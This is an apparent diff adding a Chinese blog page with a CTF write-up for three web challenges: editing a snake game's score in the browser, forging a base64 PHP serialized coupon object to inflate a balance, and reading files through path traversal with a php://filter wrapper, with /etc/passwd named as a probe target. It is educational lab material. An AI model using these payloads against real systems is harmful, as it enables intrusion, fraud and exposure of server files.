@@ -1,0 +1,347 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>御网杯2026 Web部分题解 | Jasmine_Iris</title><meta name="author" content="Jasmine_Iris"><meta name="copyright" content="Jasmine_Iris"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="御网杯网络安全竞赛Web方向部分题解">
+<meta property="og:type" content="article">
+<meta property="og:title" content="御网杯2026 Web部分题解">
+<meta property="og:url" content="http://jasmineee007.github.io/2026/06/13/%E9%A2%98%E8%A7%A3-%E5%BE%A1%E7%BD%91%E6%9D%AFWeb/index/index.html">
+<meta property="og:site_name" content="Jasmine_Iris">
+<meta property="og:description" content="御网杯网络安全竞赛Web方向部分题解">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://jasmineee007.github.io/img/photo.png">
+<meta property="article:published_time" content="2026-06-12T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-22T05:13:02.804Z">
+<meta property="article:author" content="Jasmine_Iris">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://jasmineee007.github.io/img/photo.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "御网杯2026 Web部分题解",
+  "url": "http://jasmineee007.github.io/2026/06/13/%E9%A2%98%E8%A7%A3-%E5%BE%A1%E7%BD%91%E6%9D%AFWeb/index/",
+  "image": "http://jasmineee007.github.io/img/photo.png",
+  "datePublished": "2026-06-12T16:00:00.000Z",
+  "dateModified": "2026-06-22T05:13:02.804Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Jasmine_Iris",
+      "url": "http://Jasmineee007.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/photo.png"><link rel="canonical" href="http://jasmineee007.github.io/2026/06/13/%E9%A2%98%E8%A7%A3-%E5%BE%A1%E7%BD%91%E6%9D%AFWeb/index/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css?v=5.5.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '御网杯2026 Web部分题解',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><style>hr{border:none;border-top:1.5px dashed #c0c0c0;margin:1.5em 0;}</style><link rel="stylesheet" href="/css/light-bg.css?v=59"><link rel="stylesheet" href="/css/fix-flash.css?v=5"><style>#article-container h5{font-size:1.1em!important}#article-container h6{font-size:1em!important;font-weight:700!important}</style><meta name="generator" content="Hexo 8.1.2"></head><body><div class="bg-animation" id="web_bg" style="background-image: url(/img/bg.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/photo.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">12</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/post-1.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Jasmine_Iris</span></a><a class="nav-page-title" href="/"><span class="site-name">御网杯2026 Web部分题解</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">御网杯2026 Web部分题解</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-06-12T16:00:00.000Z" title="发表于 2026-06-13 00:00:00">2026-06-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-06-22T05:13:02.804Z" title="更新于 2026-06-22 13:13:02">2026-06-22</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF-WP/">CTF-WP</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF-WP/%E6%AF%94%E8%B5%9B/">比赛</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">522</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>2分钟</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="一、WEB-Snake-Game"><a href="#一、WEB-Snake-Game" class="headerlink" title="一、WEB-Snake_Game"></a>一、WEB-Snake_Game</h1><h2 id="1-题目"><a href="#1-题目" class="headerlink" title="1. 题目"></a>1. 题目</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/posts/%E9%A2%98%E8%A7%A3-%E5%BE%A1%E7%BD%91%E6%9D%AFWeb/1780130835025-8a3a19b6-4038-4c79-87f4-da7b7e9dcbfb.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/posts/%E9%A2%98%E8%A7%A3-%E5%BE%A1%E7%BD%91%E6%9D%AFWeb/1780130858293-1a30c177-48d7-449c-9ff7-fc2dd4a0dfe4.png"></p>
+<h2 id="2-解题思路"><a href="#2-解题思路" class="headerlink" title="2. 解题思路"></a>2. 解题思路</h2><ol>
+<li>题目要求游戏得分要 300，我们可以直接修改前端代码，让初始分&gt;300</li>
+<li>F12</li>
+</ol>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/posts/%E9%A2%98%E8%A7%A3-%E5%BE%A1%E7%BD%91%E6%9D%AFWeb/1780106614013-7c5eda4b-189d-413a-93d5-dff3ddb88b7a.png"></p>
+<ol start="3">
+<li>添加覆盖脚本</li>
+</ol>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/posts/%E9%A2%98%E8%A7%A3-%E5%BE%A1%E7%BD%91%E6%9D%AFWeb/1780106659621-0e85c97e-f1b5-4fd0-bbd0-24f55340e101.png"><br><img src="/img/posts/%E9%A2%98%E8%A7%A3-%E5%BE%A1%E7%BD%91%E6%9D%AFWeb/1780106729029-5e5d81e9-e4cc-478b-9eca-180b6b501f55.png"></p>
+<p>修改成功！</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/posts/%E9%A2%98%E8%A7%A3-%E5%BE%A1%E7%BD%91%E6%9D%AFWeb/1780106762234-70bbd781-28f9-4d6c-bf50-ead6945d47bf.png"></p>
+<ol start="4">
+<li>拿到 flag</li>
+</ol>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/posts/%E9%A2%98%E8%A7%A3-%E5%BE%A1%E7%BD%91%E6%9D%AFWeb/1780106786127-431c725b-ebf2-4ebd-908a-1d1c378e461f.png"></p>
+<hr>
+<h1 id="二、WEB-PHP-Payment"><a href="#二、WEB-PHP-Payment" class="headerlink" title="二、WEB-PHP_Payment"></a>二、WEB-PHP_Payment</h1><h2 id="1-题目-1"><a href="#1-题目-1" class="headerlink" title="1. 题目"></a>1. 题目</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/posts/%E9%A2%98%E8%A7%A3-%E5%BE%A1%E7%BD%91%E6%9D%AFWeb/1780107645337-5e03f505-f9ec-4081-92b6-77441136f0f2.png"></p>
+<h2 id="2-解题思路-1"><a href="#2-解题思路-1" class="headerlink" title="2. 解题思路"></a>2. 解题思路</h2><ol>
+<li>根据题目提示知道可以用代金券拿到 Flag，但是我们的余额只有 10 金币，然后输入框里输入 base64 的代金券可以获得 Flag</li>
+</ol>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/posts/%E9%A2%98%E8%A7%A3-%E5%BE%A1%E7%BD%91%E6%9D%AFWeb/1780108671602-a64d6f0d-3d5b-4fe2-9219-317f2219291e.png"></p>
+<ol start="2">
+<li>下载附件，收集信息</li>
+</ol>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/posts/%E9%A2%98%E8%A7%A3-%E5%BE%A1%E7%BD%91%E6%9D%AFWeb/1780107829468-fda8a105-c726-4ebc-ba1b-f76cac4e38e8.png"></p>
+<p>代码审计 apply_coupon.php</p>
+<p>1、包含了另外两个文件</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/posts/%E9%A2%98%E8%A7%A3-%E5%BE%A1%E7%BD%91%E6%9D%AFWeb/1780109998273-2de6d5ad-7fde-4c96-83eb-5f0627987d12.png"></p>
+<p>2、从 POST 请求中取 coupon 参数，参数为空、解码失败会报错</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/posts/%E9%A2%98%E8%A7%A3-%E5%BE%A1%E7%BD%91%E6%9D%AFWeb/1780110146066-ccb9bd2c-f59f-4e92-8849-901207b18c61.png"></p>
+<p>如果 base64 解码出来再反序列化解码后的字符串等于$promo 返回成功。此时 $promo 对象被销毁</p>
+<p>再看models.php 里的类</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/posts/%E9%A2%98%E8%A7%A3-%E5%BE%A1%E7%BD%91%E6%9D%AFWeb/1780110364416-ee9d159d-2063-4e31-a448-afee6b9f56ed.png"></p>
+<p>有两个属性，一是代金券金额，一是代金券码。</p>
+<p>含有魔术方法 __destruct()，对象销毁时触发：逻辑是，如果如果 promo_credit 属性存在且是数字，直接加到余额上。</p>
+<p>所以，目标就是，构造一个金额够买 Flag</p>
+<p>3、 构造 代金券</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">PromoManager</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$promo_code</span> = <span class="string">&quot;x&quot;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$promo_credit</span> = <span class="number">10000000</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">PromoManager</span>()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/posts/%E9%A2%98%E8%A7%A3-%E5%BE%A1%E7%BD%91%E6%9D%AFWeb/1780116366872-6dc7b62a-ec29-4431-8577-c6273bcc0a85.png"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzoxMjoiUHJvbW9NYW5hZ2VyIjoyOntzOjEwOiJwcm9tb19jb2RlIjtzOjE6IngiO3M6MTI6InByb21vX2NyZWRpdCI7aToxMDAwMDAwMDt9</span><br></pre></td></tr></table></figure>
+
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/posts/%E9%A2%98%E8%A7%A3-%E5%BE%A1%E7%BD%91%E6%9D%AFWeb/1780116465434-73e18d77-0ec4-4f7e-b9de-403887980035.png"></p>
+<ol start="3">
+<li>购买 Flag，看 buy.php</li>
+</ol>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/posts/%E9%A2%98%E8%A7%A3-%E5%BE%A1%E7%BD%91%E6%9D%AFWeb/1780117844278-e154a428-3958-4c1a-97b2-11fd9b50e72c.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/posts/%E9%A2%98%E8%A7%A3-%E5%BE%A1%E7%BD%91%E6%9D%AFWeb/1780117872111-36a38410-feb4-4f50-ab5d-a95565a879dc.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/posts/%E9%A2%98%E8%A7%A3-%E5%BE%A1%E7%BD%91%E6%9D%AFWeb/1780117909099-914fd8d6-0565-4ce1-beee-c766a66a5519.png"></p>
+<p>用 POST 方式往 &#x2F;buy.php 传 item&#x3D;flag</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/posts/%E9%A2%98%E8%A7%A3-%E5%BE%A1%E7%BD%91%E6%9D%AFWeb/1780119024627-e9e8df68-882d-46da-9e40-dd182fd14f30.png"></p>
+<p>依据这个 调用 fetch</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fetch(&#x27;/buy.php&#x27;,&#123;method:&#x27;POST&#x27;,headers:&#123;&#x27;Content-Type&#x27;:&#x27;application/x-www-form-urlencoded&#x27;&#125;,body:&#x27;item=flag&#x27;&#125;).then(r=&gt;r.text()).then(console.log)</span><br></pre></td></tr></table></figure>
+
+<p>拿到 flag</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/posts/%E9%A2%98%E8%A7%A3-%E5%BE%A1%E7%BD%91%E6%9D%AFWeb/1780118786051-04f9118f-f743-4a7d-80fd-22368790d100.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/posts/%E9%A2%98%E8%A7%A3-%E5%BE%A1%E7%BD%91%E6%9D%AFWeb/1780118810253-7d1bacf6-8c57-4bbb-a77c-188d53fefe3a.png"></p>
+<hr>
+<h1 id="三、WEB-Enterprise-OA"><a href="#三、WEB-Enterprise-OA" class="headerlink" title="三、WEB-Enterprise_OA"></a>三、WEB-Enterprise_OA</h1><h2 id="1-题目-2"><a href="#1-题目-2" class="headerlink" title="1. 题目"></a>1. 题目</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/posts/%E9%A2%98%E8%A7%A3-%E5%BE%A1%E7%BD%91%E6%9D%AFWeb/1780120732023-e361e74a-54ae-4d3d-ad2c-13b9e2acde0b.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/posts/%E9%A2%98%E8%A7%A3-%E5%BE%A1%E7%BD%91%E6%9D%AFWeb/1780120739051-2bcadde0-71ea-4cb4-9abe-1531e375a34d.png"></p>
+<h2 id="2-解题思路-2"><a href="#2-解题思路-2" class="headerlink" title="2. 解题思路"></a>2. 解题思路</h2><ol>
+<li>根据题目提示，这题考查目录穿越、文件包含</li>
+<li>先尝试访问 flag.php</li>
+</ol>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/posts/%E9%A2%98%E8%A7%A3-%E5%BE%A1%E7%BD%91%E6%9D%AFWeb/1780121584298-2183fe35-4ad9-4320-9935-6969b6407108.png"></p>
+<p>include_path&#x3D;’.:&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php’</p>
+<p>路径分隔符是 :（冒号），Windows 用的是 ;。这是 Unix&#x2F;Linux 的特征。</p>
+<p>并且服务器是：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/posts/%E9%A2%98%E8%A7%A3-%E5%BE%A1%E7%BD%91%E6%9D%AFWeb/1780121678830-065c0063-72d7-46bd-b4e5-ad61b4dd8284.png"></p>
+<p>说明可以用 &#x2F;etc&#x2F;passwd 来探测（因为&#x2F;etc&#x2F;passwd 一定存在、可读、内容可辨识）</p>
+<ol start="3">
+<li>读源代码</li>
+</ol>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/posts/%E9%A2%98%E8%A7%A3-%E5%BE%A1%E7%BD%91%E6%9D%AFWeb/1780121169897-72e9d579-b8db-49dc-9c48-a2aa9ae70fb5.png"></p>
+<p>用 php 伪协议</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/posts/%E9%A2%98%E8%A7%A3-%E5%BE%A1%E7%BD%91%E6%9D%AFWeb/1780121252570-c36333bf-9ecc-4b8e-afc8-6b19d495b740.png"></p>
+<p>利用 base64 在线解密工具</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAKJG1vZHVsZSA9IGlzc2V0KCRfR0VUWydtb2R1bGUnXSkgPyAkX0dFVFsnbW9kdWxlJ10gOiAncHVibGljX25vdGljZXMucGhwJzsKJG1vZHVsZSA9IHN0cl9yZXBsYWNlKCcuLi8nLCAnJywgJG1vZHVsZSk7Cj8+CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KPGhlYWQ+CiAgICA8dGl0bGU+T0EgU3lzdGVtIFBvcnRhbDwvdGl0bGU+CiAgICA8c3R5bGU+CiAgICAgICAgYm9keSB7IGZvbnQtZmFtaWx5OiAnU2Vnb2UgVUknLCBUYWhvbWEsIEdlbmV2YSwgVmVyZGFuYSwgc2Fucy1zZXJpZjsgYmFja2dyb3VuZC1jb2xvcjogI2YwZjJmNTsgdGV4dC1hbGlnbjogY2VudGVyOyBtYXJnaW46IDA7IHBhZGRpbmc6IDA7fQogICAgICAgIC5oZWFkZXIgeyBiYWNrZ3JvdW5kLWNvbG9yOiAjMDA0MDgwOyBjb2xvcjogd2hpdGU7IHBhZGRpbmc6IDIwcHg7IGZvbnQtc2l6ZTogMjRweDsgZm9udC13ZWlnaHQ6IGJvbGQ7IH0KICAgICAgICAuY29udGFpbmVyIHsgYmFja2dyb3VuZC1jb2xvcjogd2hpdGU7IHBhZGRpbmc6IDIwcHg7IGJvcmRlci1yYWRpdXM6IDhweDsgbWFyZ2luOiA0MHB4IGF1dG87IHdpZHRoOiA2MCU7IGJveC1zaGFkb3c6IDAgNHB4IDhweCByZ2JhKDAsMCwwLDAuMSk7IH0KICAgICAgICAubmF2IHsgbWFyZ2luLWJvdHRvbTogMzBweDsgYm9yZGVyLWJvdHRvbTogMnB4IHNvbGlkICNlZWU7IHBhZGRpbmctYm90dG9tOiAxMHB4OyB9CiAgICAgICAgLm5hdiBhIHsgbWFyZ2luOiAwIDE1cHg7IHRleHQtZGVjb3JhdGlvbjogbm9uZTsgY29sb3I6ICMwMDQwODA7IGZvbnQtd2VpZ2h0OiBib2xkOyB9CiAgICAgICAgLm5hdiBhOmhvdmVyIHsgY29sb3I6ICMwMDY2Y2M7IH0KICAgICAgICAuY29udGVudCB7IHBhZGRpbmc6IDIwcHg7IHRleHQtYWxpZ246IGxlZnQ7IG1pbi1oZWlnaHQ6IDIwcHg7IGNvbG9yOiAjMzMzOyBsaW5lLWhlaWdodDogMS42OyB9CiAgICA8L3N0eWxlPgo8L2hlYWQ+Cjxib2R5PgogICAgPGRpdiBjbGFzcz0iaGVhZGVyIj4KICAgICAgICBFbnRlcnByaXNlIE9BIFN5c3RlbQogICAgPC9kaXY+CiAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICAgIDxkaXYgY2xhc3M9Im5hdiI+CiAgICAgICAgICAgIDxhIGhyZWY9Ij9tb2R1bGU9cHVibGljX25vdGljZXMucGhwIj5Ob3RpY2VzPC9hPgogICAgICAgICAgICA8YSBocmVmPSI/bW9kdWxlPWFib3V0LnBocCI+QWJvdXQgVXM8L2E+CiAgICAgICAgICAgIDxhIGhyZWY9Ij9tb2R1bGU9Y29udGFjdC5waHAiPkNvbnRhY3Q8L2E+CiAgICAgICAgPC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0iY29udGVudCI+CiAgICAgICAgICAgIDw/cGhwIGluY2x1ZGUoJG1vZHVsZSk7ID8+CiAgICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KPC9ib2R5Pgo8L2h0bWw+Cg==</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/posts/%E9%A2%98%E8%A7%A3-%E5%BE%A1%E7%BD%91%E6%9D%AFWeb/1780121349637-f3444687-dbbd-4ccf-8f7d-ce77b58f7652.png"></p>
+<ol start="4">
+<li>访问绝对路径</li>
+</ol>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/posts/%E9%A2%98%E8%A7%A3-%E5%BE%A1%E7%BD%91%E6%9D%AFWeb/1780122049501-b0d05a59-82ac-4ded-b0c2-edfe9071afac.png"></p>
+<ol start="5">
+<li>访问 flag 文件</li>
+</ol>
+<p>比如：flag.php   flag.txt</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/posts/%E9%A2%98%E8%A7%A3-%E5%BE%A1%E7%BD%91%E6%9D%AFWeb/1780122555111-57f73e0e-1544-4ca2-9b21-1601cc3369e5.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/posts/%E9%A2%98%E8%A7%A3-%E5%BE%A1%E7%BD%91%E6%9D%AFWeb/1780122767670-066bea98-d602-4897-84b6-fa1e1ccfeb50.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/posts/%E9%A2%98%E8%A7%A3-%E5%BE%A1%E7%BD%91%E6%9D%AFWeb/1780122738391-ff32effd-84f0-4df7-8ed8-edcd138a6347.png"></p>
+<blockquote>
+<p>本文为个人学习笔记，如有错误或疏漏，欢迎批评指正。</p>
+</blockquote>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post-share"><div class="social-share" data-image="/img/photo.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/06/14/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/index/" title="逻辑漏洞"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">逻辑漏洞</div></div><div class="info-2"><div class="info-item-1">逻辑漏洞的定义、危害、分类及常见类型总结，包括越权漏洞、数据篡改、任意密码重置等</div></div></div></a><a class="pagination-related" href="/2026/06/08/RCE%E6%BC%8F%E6%B4%9E/index/" title="RCE漏洞"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">RCE漏洞</div></div><div class="info-2"><div class="info-item-1">远程代码/命令执行漏洞（RCE）的原理、常见危险函数、利用方式与防御措施</div></div></div></a></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="giscus-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/photo.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Jasmine_Iris</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">12</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Jasmineee007"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Jasmineee007" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客~ 📝<br><hr>最近更新：2026-06-22<br><br>新增文章：<br><a href="/2026/06/22/PHP基础安全/index/">PHP基础安全</a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81WEB-Snake-Game"><span class="toc-text">一、WEB-Snake_Game</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E9%A2%98%E7%9B%AE"><span class="toc-text">1. 题目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-text">2. 解题思路</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81WEB-PHP-Payment"><span class="toc-text">二、WEB-PHP_Payment</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E9%A2%98%E7%9B%AE-1"><span class="toc-text">1. 题目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-1"><span class="toc-text">2. 解题思路</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" 